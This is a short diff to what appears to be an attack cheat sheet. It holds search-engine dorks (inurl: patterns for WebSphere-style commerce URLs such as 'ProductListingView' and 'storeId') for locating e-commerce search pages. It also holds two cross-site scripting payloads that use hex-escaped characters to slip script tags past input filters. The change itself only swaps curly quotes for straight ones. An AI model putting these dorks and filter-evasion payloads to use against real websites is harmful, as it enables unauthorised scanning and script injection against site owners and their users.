@@ -27,10 +27,10 @@ inurl:/­search_results.php?se­arch=
 inurl:categoryId inurl:storeId (2 million results)
 inurl:resultCatEntryType
 inurl:searchTermScope
-inurl:”webapp/wcs”
-inurl:”ProductListingView”
-inurl:”AdvancedSearchDisplay”
-inurl:”CompareProductsDisplayView”
+inurl:"webapp/wcs"
+inurl:"ProductListingView"
+inurl:"AdvancedSearchDisplay"
+inurl:"CompareProductsDisplayView"
 inurl:parent_category_rn
 <script\x20type="text/javascript">javascript:alert(1);</script>
 <script\x3Etype="text/javascript">javascript:alert(1);</script>
